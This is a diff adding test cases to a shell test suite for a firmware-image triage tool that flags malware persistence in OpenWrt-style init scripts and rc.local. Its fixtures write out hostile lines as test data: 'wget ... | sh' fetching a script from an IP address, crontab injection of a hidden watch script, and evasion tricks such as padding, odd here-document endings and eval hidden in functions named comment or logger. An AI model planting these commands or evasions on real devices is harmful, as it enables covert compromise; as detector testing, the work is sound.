@@ -1375,6 +1375,52 @@ triage --root "$D/m" --upper "$U" -o "$D/out" --fix --no-report >"$D/fix.txt" 2>
 expect "--fix under --root writes through no link that leads out of the image (exit $rc)" '[ $rc = 3 ] && grep -q gl-helper "$D/victim/rc.local" && grep -q gl-helper "$D/victim/root" && grep -q "under --root a link is not written through" "$D/fix.txt"'
 umount "$D/m"
 
+echo "=== final review of 2.55: a subshell before a redirection with a blank or a pipe, groups inside groups"
+D=$(mkscen r255f1 "$OWL"); U=$D/u
+mkdir -p "$U/etc/init.d"
+printf '#!/bin/sh\n(sleep 5; /etc/config/.gl/gl-helper) > /dev/null 2>&1 &\n' >"$U/etc/init.d/sub-redir"
+printf '#!/bin/sh\n(sleep 5; /etc/config/.gl/gl-helper) | logger -t x &\n' >"$U/etc/init.d/sub-pipe"
+printf '#!/bin/sh\n{ crontab -l; echo "*/3 * * * * /etc/config/.gl/watch.sh"; (true); } | crontab -\n' >"$U/etc/init.d/grp-nest"
+printf '#!/bin/sh\n{\ncrontab -l\necho "*/3 * * * * /etc/config/.gl/watch.sh"\nfind /tmp -name x -exec true {} \;\n} | crontab -\n' >"$U/etc/init.d/grp-find"
+printf '#!/bin/sh\n{\ncrontab -l\ncase "$x" in\na) true ;;\nesac\necho "*/3 * * * * /etc/config/.gl/watch.sh"\n} | crontab -\n' >"$U/etc/init.d/grp-case"
+mnt "$D" "$OWL"
+run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
+grep -E '^ +(IOC|REVIEW) ' "$D/check.txt"
+expect "( ...; prog ) > /dev/null and ( ...; prog ) | logger start the malware: IOC persist-ref (exit $rc)" '[ $rc = 1 ] && grep -q "IOC  *persist-ref  */etc/init.d/sub-redir" "$D/check.txt" && grep -q "IOC  *persist-ref  */etc/init.d/sub-pipe" "$D/check.txt"'
+expect "a group inside a group, the {} of find and the pattern of a case keep the echo that goes into crontab" 'grep -q "IOC  *persist-ref  */etc/init.d/grp-nest" "$D/check.txt" && grep -q "IOC  *persist-ref  */etc/init.d/grp-find" "$D/check.txt" && grep -q "IOC  *persist-ref  */etc/init.d/grp-case" "$D/check.txt"'
+umount "$D/m"
+
+echo "=== final review of 2.55: padding keeps an empty line, a here-document's end word with #"
+D=$(mkscen r255f2 "$OWL"); U=$D/u
+mkdir -p "$U/etc/init.d"
+pad() { i=0; while [ $i -lt 30000 ]; do echo "# padding $i xxxxxxxxxxxxxxxxxxxxxxxxxxxx"; i=$((i + 1)); done; }
+{ echo '#!/bin/sh'; pad; printf ': \\\n\n/etc/config/.gl/gl-helper &\n'; } >"$U/etc/init.d/cont"
+{ echo '#!/bin/sh'; printf 'cat <<\\#E >/dev/null\nx\n#E\n'; pad; printf '/etc/config/.gl/gl-helper &\n'; } >"$U/etc/init.d/hd-hash"
+mnt "$D" "$OWL"
+s=$(date +%s); run "$D" "$OWL" --check >"$D/check.txt"; rc=$?; e=$(($(date +%s) - s))
+grep -E '^ +(IOC|REVIEW) ' "$D/check.txt"
+expect "in a file over 1 MB, a line ended with \\ before an empty line, and a here-document ended by #E, start the malware ($e s, exit $rc)" '[ $rc = 1 ] && grep -q "IOC  *persist-ref  */etc/init.d/cont" "$D/check.txt" && grep -q "IOC  *persist-ref  */etc/init.d/hd-hash" "$D/check.txt" && [ $e -le 30 ]'
+umount "$D/m"
+
+echo "=== final review of 2.55: logger -st, a function named comment, a logger of its own in --fix"
+D=$(mkscen r255f3 "$OWL"); U=$D/u
+mkdir -p "$U/etc/init.d"
+printf '#!/bin/sh\n{\nlogger -st x "wget -qO- http://65.20.71.131/ni.sh | sh"\n} 2>&1 | sh\n' >"$U/etc/init.d/logger-st"
+printf '#!/bin/sh\ncomment() { eval "$1"; }\nx=1 comment "wget -qO- http://65.20.71.131/ni.sh | sh"\n' >"$U/etc/init.d/own-comment"
+mnt "$D" "$OWL"
+run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
+grep -E '^ +(IOC|REVIEW) ' "$D/check.txt"
+expect "logger -st in a group piped to sh, and a function named comment, fetch from the server: IOC (exit $rc)" '[ $rc = 1 ] && grep -q "IOC  *persist-ref  */etc/init.d/logger-st" "$D/check.txt" && grep -q "IOC  *persist-ref  */etc/init.d/own-comment" "$D/check.txt"'
+umount "$D/m"
+D=$(mkscen r255f4 "$OWL"); U=$D/u
+mkdir -p "$U/etc/config/.gl"
+echo x >"$U/etc/config/.gl/gl-helper"
+printf '# Put your custom commands here\nlogger() { eval "$1"; }\nlogger "wget -qO- http://65.20.71.131/ni.sh | sh"\nexit 0\n' >"$U/etc/rc.local"
+mnt "$D" "$OWL"
+triage --root "$D/m" --upper "$U" -o "$D/out" --fix --no-report >"$D/fix.txt" 2>&1; rc=$?
+expect "--fix without a base image takes the line out that a logger of its own runs (exit $rc)" '[ $rc = 2 ] && ! grep -q "65.20.71.131" "$D/m/etc/rc.local" && grep -q "exit 0" "$D/m/etc/rc.local"'
+umount "$D/m"
+
 echo "=== what the base image's busybox loads must be the base image's (issue 8)"
 OWB=$BASE/openwrt-rom-libs
 cp -a "$OWL" "$OWB"; mkdir -p "$OWB/lib"
